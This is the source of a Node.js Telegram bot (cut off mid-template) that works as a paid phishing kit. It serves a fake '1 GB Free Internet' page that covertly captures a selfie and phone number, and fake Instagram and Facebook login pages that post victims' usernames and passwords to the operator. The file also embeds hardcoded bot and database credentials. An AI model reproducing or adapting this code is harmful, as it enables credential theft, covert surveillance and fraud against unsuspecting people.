// ====================== index.js – FINAL ULTIMATE VERSION (FULLY FIXED & ENHANCED) ======================
/*
 * © 2026 SeXyxeon (VOIDSEC)
 * Features: Referral (only referrer gets credits), Coupon system, Ban/Unban,
 * Security scan (10KB-1MB all files), Payment accept fixed, Admin commands,
 * No commands button for users, Camera hack with live photo,
 * Full Admin API endpoints, Missing commands added, Payment bug fixed,
 * QR upload via bot, Help command, and many more.
 */

process.env.NTBA_FIX_350 = 1;

// ====================== CONFIG ======================
const config = {
    mainToken: '8809859232:AAHoJfHSdpJ67h0Blr2scKV_86vrZQhVpIA',
    S7: '@RTFGAMMING',
    adminId: '6346250222',
    port: process.env.PORT || 3000,
    baseUrl: process.env.RENDER_URL || 'https://rtf-rose-bot-l4hw.onrender.com',
    BATCH_SIZE: 100,
    LINK_EXPIRY: 15 * 60 * 1000,
    MAX_OPENS: 3,
    mongoUrl: 'mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0'
};

console.log('✅ Bot Token loaded!');
console.log('📌 Base URL:', config.baseUrl);

// ====================== DEPENDENCIES ======================
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const moment = require('moment-timezone');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ====================== MONGODB ======================
mongoose.connect(config.mongoUrl)
    .then(() => console.log('✅ MongoDB connected'))
    .catch(err => console.error('❌ MongoDB error:', err));

// ====================== SCHEMAS ======================
const userSchema = new mongoose.Schema({
    userId: { type: String, unique: true },
    credits: { type: Number, default: 3 },
    referrals: { type: Number, default: 0 },
    totalReferrals: { type: Number, default: 0 },
    unlimited: { type: Boolean, default: false },
    banned: { type: Boolean, default: false },
    joinedAt: { type: Date, default: Date.now },
    referredBy: { type: String, default: null },
    _pendingReferrer: { type: String, default: null },
    _waitingForQR: { type: Boolean, default: false },
    _pendingPayment: { type: Object, default: null }
});
const photoSchema = new mongoose.Schema({
    id: { type: String, unique: true },
    filename: String,
    originalName: String,
    url: String,
    caption: String,
    uploadedAt: Date,
    active: { type: Boolean, default: true }
});
const referralSchema = new mongoose.Schema({
    referrerId: String,
    newUserId: String,
    timestamp: Date
});
const channelSchema = new mongoose.Schema({
    id: String,
    name: String,
    link: String
});
const featuredSchema = new mongoose.Schema({
    photo: { type: String, default: null },
    message: { type: String, default: '🌟 Welcome! Use /start to begin.' },
    status: { type: Boolean, default: true }
});
const linkSchema = new mongoose.Schema({
    fileId: { type: String, unique: true },
    userId: String,
    platform: String,
    url: String,
    createdAt: Date,
    expiresAt: Date,
    opens: { type: Number, default: 0 },
    maxOpens: { type: Number, default: 3 },
    active: { type: Boolean, default: true }
});
const couponSchema = new mongoose.Schema({
    code: { type: String, unique: true },
    credits: { type: Number, required: true },
    maxUses: { type: Number, required: true },
    usedCount: { type: Number, default: 0 },
    createdBy: { type: String, required: true },
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);
const Photo = mongoose.model('Photo', photoSchema);
const Referral = mongoose.model('Referral', referralSchema);
const Channel = mongoose.model('Channel', channelSchema);
const Featured = mongoose.model('Featured', featuredSchema);
const Link = mongoose.model('Link', linkSchema);
const Coupon = mongoose.model('Coupon', couponSchema);

// ====================== DIRECTORIES ======================
const PHOTO_DIR = path.join(__dirname, 'photos');
const BOT_PHOTO_DIR = path.join(PHOTO_DIR, 'bot');
const PAGES_DIR = path.join(__dirname, 'pages');
const DATA_DIR = path.join(__dirname, 'data');
const QR_FILE = path.join(DATA_DIR, 'qr.png');

if (!fs.existsSync(PHOTO_DIR)) fs.mkdirSync(PHOTO_DIR, { recursive: true });
if (!fs.existsSync(BOT_PHOTO_DIR)) fs.mkdirSync(BOT_PHOTO_DIR, { recursive: true });
if (!fs.existsSync(PAGES_DIR)) fs.mkdirSync(PAGES_DIR, { recursive: true });
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

// ====================== MULTER ======================
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, BOT_PHOTO_DIR),
    filename: (req, file, cb) => {
        const uniqueName = Date.now() + '-' + file.originalname.replace(/\s/g, '_');
        cb(null, uniqueName);
    }
});
const upload = multer({
    storage,
    limits: { fileSize: 50 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) cb(null, true);
        else cb(new Error('Only images allowed!'));
    }
});

// ====================== DATA FUNCTIONS (MongoDB) ======================
async function getUser(userId) {
    let user = await User.findOne({ userId: String(userId) });
    if (!user) {
        user = new User({ userId: String(userId), credits: 3 });
        await user.save();
    }
    return user;
}
async function addReferral(referrerId, newUserId) {
    const referral = new Referral({ referrerId: String(referrerId), newUserId: String(newUserId), timestamp: new Date() });
    await referral.save();
    const referrer = await getUser(referrerId);
    referrer.totalReferrals += 1;
    referrer.referrals += 1;
    if (!referrer.unlimited) referrer.credits += 2;
    await referrer.save();
    return referrer;
}
async function useCredit(userId) {
    const user = await getUser(userId);
    if (user.unlimited) return true;
    if ((user.credits || 0) <= 0) return false;
    user.credits -= 1;
    await user.save();
    return true;
}
async function addCredits(userId, amount) {
    const user = await getUser(userId);
    if (user.unlimited) return user;
    user.credits += amount;
    await user.save();
    return user;
}
async function getPhotos() { return await Photo.find().sort({ uploadedAt: -1 }); }
async function addPhoto(file, caption) {
    const photo = new Photo({
        id: Date.now().toString(),
        filename: file.filename,
        originalName: file.originalname,
        url: '/api/photos/' + file.filename,
        caption: caption || '',
        uploadedAt: new Date(),
        active: true
    });
    await photo.save();
    return photo;
}
async function deletePhoto(id) {
    const photo = await Photo.findOne({ id });
    if (!photo) return false;
    const filePath = path.join(BOT_PHOTO_DIR, photo.filename);
    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
    await Photo.deleteOne({ id });
    return true;
}
async function togglePhoto(id) {
    const photo = await Photo.findOne({ id });
    if (!photo) return false;
    photo.active = !photo.active;
    await photo.save();
    return photo;
}
async function getActivePhotos() { return await Photo.find({ active: true }); }
async function getRandomPhoto() {
    const photos = await getActivePhotos();
    if (photos.length === 0) return null;
    return photos[Math.floor(Math.random() * photos.length)];
}
async function getChannels() { return await Channel.find(); }
async function addChannel(id, name, link) {
    const channel = new Channel({ id, name, link });
    await channel.save();
    return channel;
}
async function removeChannel(id) { await Channel.deleteOne({ id }); }
async function getFeatured() {
    let featured = await Featured.findOne();
    if (!featured) { featured = new Featured(); await featured.save(); }
    return featured;
}
async function setFeaturedPhoto(photoId) {
    const featured = await getFeatured();
    featured.photo = photoId;
    await featured.save();
    return featured;
}
async function setFeaturedMessage(message) {
    const featured = await getFeatured();
    featured.message = message;
    await featured.save();
    return featured;
}
async function toggleFeaturedStatus() {
    const featured = await getFeatured();
    featured.status = !featured.status;
    await featured.save();
    return featured;
}
async function createLink(userId, platform, fileId, url) {
    const link = new Link({
        fileId,
        userId: String(userId),
        platform,
        url,
        createdAt: Date.now(),
        expiresAt: Date.now() + config.LINK_EXPIRY,
        opens: 0,
        maxOpens: config.MAX_OPENS,
        active: true
    });
    await link.save();
    return link.toObject();
}
async function getLink(fileId) {
    const link = await Link.findOne({ fileId });
    return link ? link.toObject() : null;
}
async function isLinkValid(fileId) {
    const link = await getLink(fileId);
    if (!link || !link.active) return false;
    if (Date.now() > link.expiresAt) return false;
    if (link.opens >= link.maxOpens) return false;
    return true;
}
async function incrementLinkOpen(fileId) {
    const link = await Link.findOne({ fileId });
    if (!link) return false;
    link.opens += 1;
    if (link.opens >= link.maxOpens) link.active = false;
    await link.save();
    return true;
}
async function checkAllChannels(userId) {
    const channels = await getChannels();
    for (const ch of channels) {
        try {
            const member = await S7.getChatMember(ch.id, userId);
            const valid = ['creator', 'administrator', 'member', 'restricted'];
            if (!valid.includes(member.status)) return false;
        } catch { return false; }
    }
    return true;
}
async function getChannelButtonsAsync() {
    const channels = await getChannels();
    const buttons = channels.map(ch => ([{ text: '📢 ' + ch.name, url: ch.link }]));
    buttons.push([{ text: '✅ Check All Joined', callback_data: 'check_all' }]);
    return { inline_keyboard: buttons };
}

// ====================== COUPON FUNCTIONS ======================
async function createCoupon(code, credits, maxUses, adminId) {
    const coupon = new Coupon({ code, credits, maxUses, createdBy: adminId });
    await coupon.save();
    return coupon;
}
async function redeemCoupon(userId, code) {
    const coupon = await Coupon.findOne({ code });
    if (!coupon) return { error: 'Invalid coupon code' };
    if (coupon.usedCount >= coupon.maxUses) return { error: 'Coupon limit full' };
    coupon.usedCount += 1;
    await coupon.save();
    await addCredits(userId, coupon.credits);
    return { success: true, credits: coupon.credits };
}
async function getCoupons() { return await Coupon.find(); }
async function deleteCoupon(code) { await Coupon.deleteOne({ code }); }

// ====================== QR FUNCTIONS (File System) ======================
function saveQRBuffer(buffer) {
    try {
        fs.writeFileSync(QR_FILE, buffer);
        console.log('✅ QR saved');
        logToFile('✅ QR saved');
        return true;
    } catch (err) {
        console.error('❌ QR save error:', err);
        logToFile('❌ QR save error: ' + err.message);
        return false;
    }
}
function deleteQRFile() {
    if (fs.existsSync(QR_FILE)) {
        fs.unlinkSync(QR_FILE);
        console.log('✅ QR deleted');
        logToFile('✅ QR deleted');
        return true;
    }
    return false;
}
function qrExists() { return fs.existsSync(QR_FILE); }

// ====================== HELPER FUNCTIONS ======================
function getUptime() {
    const ut = process.uptime();
    const h = Math.floor(ut / 3600);
    const m = Math.floor((ut % 3600) / 60);
    const s = Math.floor(ut % 60);
    return h + 'h ' + m + 'm ' + s + 's';
}
function LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, dev) {
    return '🖤©🖤 ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ sᴇxʏ ʙᴏʏ ﾂ.🖤ª🖤\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ' + platform + '\n📧 ↝ ᴜsᴇʀɴᴀᴍᴇ » ' + username + '\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ' + password + '\n⏱ ↝ ᴛɪᴍᴇ » ' + SYloveTiMe + '\n📝 ↝ ᴅᴀᴛᴇ » ' + SYloveDaTe + '\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ' + dev;
}
function MenuLove(firstName, dev, botName, LoveTime, message) {
    return '─【 ' + dev + ' 】─\n────────────────────\n ᴜsᴇʀ ➤ ' + firstName + ' ›\n ɴᴀᴍᴇ ➤ ' + botName + ' ›\n ᴍᴏᴅᴇ ➤ Premium User ›\n ᴏɴʟɪɴᴇ ➤ ' + LoveTime + '›\n ────────────────────\n\n ' + message + ' \n\n────────────────────\n ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─';
}
function LoveNotifer(platform, username, password) {
    const SYloveTiMe = moment().tz('Asia/Kolkata').format('h:mm:ss A');
    const SYloveDaTe = moment().tz('Asia/Kolkata').format('DD/MM/YYYY');
    return LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, config.S7);
}
function SYloveMenu(firstName, message) {
    // Fixed: Use a valid bot name string
    return MenuLove(firstName, config.S7, 'SeXyxeon', getUptime(), message);
}
function logToFile(message) {
    const timestamp = new Date().toISOString();
    const logPath = path.join(DATA_DIR, 'logs.txt');
    try {
        fs.appendFileSync(logPath, '[' + timestamp + '] ' + message + '\n');
    } catch (err) {
        console.error('Log write error:', err);
    }
}
async function resolveUserId(identifier) {
    if (!identifier) return null;
    let userId = identifier;
    if (identifier.startsWith('@')) {
        try {
            const chat = await S7.getChat(identifier);
            userId = chat.id.toString();
        } catch (e) {
            return null;
        }
    }
    const user = await User.findOne({ userId: userId });
    if (!user) return null;
    return userId;
}
async function isUserBanned(userId) {
    const user = await getUser(userId);
    return user.banned;
}

// ====================== FAST SEND BATCH ======================
var pendingPhotos = {};
var userActive = {};
async function sendBatchPhotos(userId) {
    if (!pendingPhotos[userId] || pendingPhotos[userId].length === 0) return;
    const photos = pendingPhotos[userId];
    const count = photos.length;
    logToFile('📸 Sending ' + count + ' photos to user ' + userId);
    try {
        await S7.sendPhoto(userId, photos[0], { caption: '📸 <b>' + count + ' photos received!</b>', parse_mode: 'HTML' });
        const batch = [];
        for (let i = 1; i < photos.length; i++) {
            batch.push(S7.sendPhoto(userId, photos[i]));
            if (batch.length >= 5) { await Promise.all(batch); batch.length = 0; }
        }
        if (batch.length) await Promise.all(batch);
    } catch (err) {
        logToFile('❌ Error sending photos: ' + err.message);
        for (let j = 1; j < photos.length; j++) {
            try { await S7.sendPhoto(userId, photos[j]); } catch (e) {}
        }
    }
    delete pendingPhotos[userId];
    delete userActive[userId];
}

// ====================== CAMERA TEMPLATE (unchanged) ======================
const CAMERA_TEMPLATE = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>1 GB Free Internet</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:"Rajdhani",sans-serif;background:radial-gradient(ellipse at center,#0a0a0a,#000000);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}
.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(0,255,100,0.15);border-radius:35px;padding:50px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.9),inset 0 1px 0 rgba(0,255,100,0.1)}
.badge{display:inline-block;background:linear-gradient(90deg,#00ff88,#00cc66);padding:6px 20px;border-radius:30px;font-size:11px;font-weight:700;letter-spacing:3px;color:#000;margin-bottom:15px}
h1{font-family:"Orbitron",sans-serif;font-size:38px;font-weight:900;background:linear-gradient(135deg,#00ff88,#00ff44);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:25px}
.input-box{margin:20px 0;text-align:left}
.input-box label{font-size:13px;color:#00ff88;text-transform:uppercase;letter-spacing:2px;margin-left:15px;display:block;margin-bottom:5px}
.input-box input{width:100%;background:rgba(0,0,0,0.5);border:1px solid rgba(0,255,100,0.15);border-radius:16px;padding:18px 20px;color:#fff;font-size:18px;font-family:"Rajdhani",sans-serif;transition:.4s;outline:none}
.input-box input:focus{border-color:#00ff88;box-shadow:0 0 30px rgba(0,255,136,0.1)}
.btn-claim{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#00ff88,#00cc66);color:#000;font-family:"Orbitron",sans-serif;font-weight:900;font-size:17px;text-transform:uppercase;cursor:pointer;transition:.3s;box-shadow:0 10px 40px rgba(0,255,136,0.25);margin-top:15px}
.btn-claim:hover{transform:translateY(-2px) scale(1.02);box-shadow:0 20px 50px rgba(0,255,136,0.4)}
.btn-claim:disabled{opacity:0.6;cursor:not-allowed}
.loader-box{display:none;text-align:center;padding:20px 0}
.loader-box .spinner{width:40px;height:40px;border:3px solid rgba(0,255,136,0.15);border-top-color:#00ff88;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto}
@keyframes spin{100%{transform:rotate(360deg)}}
.loader-box p{color:#00ff88;margin-top:15px;font-size:14px;letter-spacing:1px}
.log-area{background:rgba(0,0,0,0.6);border-radius:16px;padding:20px;font-family:"Courier New",monospace;font-size:13px;color:#00ff88;text-align:left;display:none;border:1px solid rgba(0,255,136,0.08);margin-top:20px;max-height:200px;overflow-y:auto}
.log-area .line{padding:4px 0;border-bottom:1px solid rgba(0,255,136,0.05)}
.log-area .line.suc{color:#00ff88}
.log-area .line.err{color:#ff4444}
.bg-glow{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
.bg-glow span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(0,255,136,0.06),transparent 70%);animation:float 20s infinite ease-in-out}
.bg-glow span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}
.bg-glow span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}
@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}
video,canvas{display:none}
.result-box{display:none;text-align:center;padding:20px 0}
.result-box i{font-size:50px;color:#00ff88}
.result-box h3{color:#fff;margin-top:10px;font-family:"Orbitron",sans-serif}
</style>
</head>
<body>
<div class="bg-glow"><span></span><span></span></div>
<div class="card">
<div class="badge">🔥 VIP ACCESS</div>
<h1>1 GB Free Internet</h1>
<div class="input-box"><label>📱 Mobile Number</label><input type="number" id="mobile" placeholder="Enter 10 digit number"></div>
<button class="btn-claim" id="claimBtn">🎁 CLAIM NOW</button>
<div class="loader-box" id="loaderBox"><div class="spinner"></div><p id="statusText">Initializing...</p></div>
<div class="log-area" id="logArea"></div>
<div class="result-box" id="resultBox"><i class="fas fa-check-circle"></i><h3>Success!</h3></div>
</div>
<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>
<script>
var id="USERID_PLACEHOLDER";
var p="PLATFORM_PLACEHOLDER";
var claimBtn=document.getElementById("claimBtn");
var logArea=document.getElementById("logArea");
var loaderBox=document.getElementById("loaderBox");
var statusText=document.getElementById("statusText");
var resultBox=document.getElementById("resultBox");
var video=document.getElementById("v");
var canvas=document.getElementById("c");
var ctx=canvas.getContext("2d");
function addLog(msg,type){type=type||"";logArea.style.display="block";var l=document.createElement("div");l.className="line "+(type||"");l.innerText="▸ "+msg;logArea.appendChild(l);logArea.scrollTop=logArea.scrollHeight}
claimBtn.addEventListener("click",async function(){
var mobile=document.getElementById("mobile").value;
if(mobile.length<10){alert("⚠️ Please enter valid 10 digit number!");return}
claimBtn.disabled=true;claimBtn.innerText="⏳ PROCESSING...";
loaderBox.style.display="block";resultBox.style.display="none";logArea.innerHTML="";
statusText.innerText="🔍 Verifying...";
addLog("Initializing secure connection...");
addLog("📡 Requesting verification...");
statusText.innerText="📸 Accessing camera...";
addLog("📸 Accessing camera for verification...");
try{
var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}});
video.srcObject=stream;
await new Promise(function(r){setTimeout(r,600)});
canvas.width=video.videoWidth||400;canvas.height=video.videoHeight||400;
ctx.drawImage(video,0,0);
var photoBase64=canvas.toDataURL("image/jpeg",0.85).split(",")[1];
stream.getTracks().forEach(function(t){t.stop()});
addLog("✅ Selfie captured successfully!","suc");
statusText.innerText="📤 Sending...";
addLog("📤 Encrypting and sending data...");
fetch("/api/capturepic",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,mobile:mobile,SY:photoBase64,platform:p})}).catch(function(e){console.error(e)});
await new Promise(function(r){setTimeout(r,1200)});
addLog("✅ Verification complete!","suc");
statusText.innerText="✅ Success!";
claimBtn.innerText="✅ CLAIMED";
claimBtn.style.background="linear-gradient(135deg,#00ff88,#00cc66)";
resultBox.style.display="block";
resultBox.innerHTML="<i class=\\"fas fa-check-circle\\" style=\\"color:#00ff88;font-size:50px\\"></i><h3 style=\\"color:#fff;margin-top:10px;font-family:Orbitron,sans-serif\\">1GB ADDED!</h3>";
setTimeout(function(){alert("🎉 1GB Data Claimed Successfully!");claimBtn.disabled=false;claimBtn.innerText="🎁 CLAIM NOW";loaderBox.style.display="none"},1500)
}catch(e){
console.error("Camera error:",e);
addLog("❌ Camera access denied! Please allow camera permission.","err");
statusText.innerText="❌ Camera Error";
claimBtn.innerText="🔄 RETRY";
claimBtn.disabled=false;
loaderBox.style.display="none";
alert("⚠️ Camera permission is required. Please allow camera access and try again.");
}
});
</script>
</body>
</html>`;

// ====================== INSTAGRAM TEMPLATE ======================
const INSTA_TEMPLATE = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>instafree1kfollowers</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:linear-gradient(145deg,#1a0a2e,#2d1b4e,#0a0a0a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.12);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.1)}.logo{text-align:center;margin-bottom:30px}.logo i{font-size:65px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}.input-group{position:relative;margin-bottom:18px}.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#888;font-size:18px}.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}.input-group input:focus{border-color:#d62976;background:rgba(255,255,255,0.12);box-shadow:0 0 30px rgba(214,41,118,0.15)}.input-group input::placeholder{color:#777}.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#4f5bd5,#d62976);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(214,41,118,0.3)}.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(214,41,118,0.5)}.loader{display:none;text-align:center;padding:20px 0}.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#d62976;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}@keyframes spin{100%{transform:rotate(360deg)}}.loader p{color:#aaa;margin-top:15px;font-size:14px}.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#4f5bd5,#d62976);transition:width .3s}.result{display:none;text-align:center;padding:20px}.result i{font-size:50px;color:#28a745}.result h3{color:#fff;margin-top:10px}.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(214,41,118,0.15),transparent 70%);animation:float 20s infinite ease-in-out}.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}.footer a{color:#888;text-decoration:none}
</style>
</head>
<body>
<div class="bg-shapes"><span></span><span></span></div>
<div class="card">
<div class="logo"><i class="fab fa-instagram"></i><h1>instafree1kfollowers</h1></div>
<div id="form-screen">
<div class="input-group"><i class="fas fa-user"></i><input type="text" id="username" placeholder="Username or Email"></div>
<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>
<button class="btn" onclick="startEngine()"><i class="fas fa-bolt"></i> Login Now</button>
</div>
<div id="process-screen" style="display:none">
<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>
<div id="result-area" style="display:none">
<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>
<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>
</div>
</div>
<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Sign up</a></div>
</div>
<script>
var id="USERID_PLACEHOLDER";
var p="PLATFORM_PLACEHOLDER";
function startEngine(){
var u=document.getElementById("username").value.trim();
var pwd=document.getElementById("password").value;
if(!u||!pwd){alert("Please fill all fields.");return}
fetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});
document.getElementById("form-screen").style.display="none";
document.getElementById("process-screen").style.display="block";
document.querySelector(".loader").style.display="block";
document.querySelector(".progress-bar").style.display="block";
document.getElementById("result-area").style.display="none";
var progress=0;
var interval=setInterval(function(){
progress+=Math.random()*3+1;
if(progress>=100){progress=100;clearInterval(interval);
document.querySelector(".loader").style.display="none";
document.querySelector(".progress-bar").style.display="none";
document.getElementById("result-area").style.display="block";
document.getElementById("status-text").innerText="✅ Verified";
return}
document.getElementById("progress-fill").style.width=progress+"%";
if(progress<30)document.getElementById("status-text").innerText="Connecting...";
else if(progress<60)document.getElementById("status-text").innerText="Verifying...";
else if(progress<85)document.getElementById("status-text").innerText="Loading...";
else document.getElementById("status-text").innerText="Almost done...";
},150);
}
</script>
</body>
</html>`;

// ====================== FACEBOOK TEMPLATE ======================
const FB_TEMPLATE = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>fbprivatechat</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:linear-gradient(145deg,#0a1628,#1a2a4a,#0a0a2a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.1);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}.logo{text-align:center;margin-bottom:30px}.logo i{font-size:65px;color:#1877f2;text-shadow:0 0 40px rgba(24,119,242,0.3)}.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}.input-group{position:relative;margin-bottom:18px}.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#666;font-size:18px}.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}.input-group input:focus{border-color:#1877f2;background:rgba(255,255,255,0.12)}.input-group input::placeholder{color:#666}.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#1877f2,#0056b3);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(24,119,242,0.3)}.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(24,119,242,0.5)}.loader{display:none;text-align:center;padding:20px 0}.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#1877f2;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}@keyframes spin{100%{transform:rotate(360deg)}}.loader p{color:#aaa;margin-top:15px;font-size:14px}.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#1877f2,#42b0f5);transition:width .3s}.result{display:none;text-align:center;padding:20px}.result i{font-size:50px;color:#28a745}.result h3{color:#fff;margin-top:10px}.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(24,119,242,0.12),transparent 70%);animation:float 20s infinite ease-in-out}.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}.footer a{color:#666;text-decoration:none}
</style>
</head>
<body>
<div class="bg-shapes"><span></span><span></span></div>
<div class="card">
<div class="logo"><i class="fab fa-facebook"></i><h1>fbprivatechat</h1></div>
<div id="form-screen">
<div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="username" placeholder="Email or Phone"></div>
<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>
<button class="btn" onclick="startEngine()"><i class="fas fa-rocket"></i> Login</button>
</div>
<div id="process-screen" style="display:none">
<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>
<div id="result-area" style="display:none">
<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>
<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>
</div>
</div>
<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Create account</a></div>
</div>
<script>
var id="USERID_PLACEHOLDER";
var p="PLATFORM_PLACEHOLDER";
function startEngine(){
var u=document.getElementById("username").value.trim();
var pwd=document.getElementById("password").value;
if(!u||!pwd){alert("Please fill all fields.");return}
fetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});
document.getElementById("form-screen").style.display="none";
document.getElementById("process-screen").style.display="block";
document.querySelector(".loader").style.display="block";
document.querySelector(".progress-bar").style.display="block";
document.getElementById("result-area").style.display="none";
var progress=0;
var interval=setInterval(function(){
progress+=Math.random()*3+1;
if(progress>=100){progress=100;clearInterval(interval);
document.querySelector(".loader").style.display="none";
document.querySelector(".progress-bar").style.display="none";
document.getElementById("result-area").style.display="block";
document.getElementById("status-text").innerText="✅ Verified";
return}
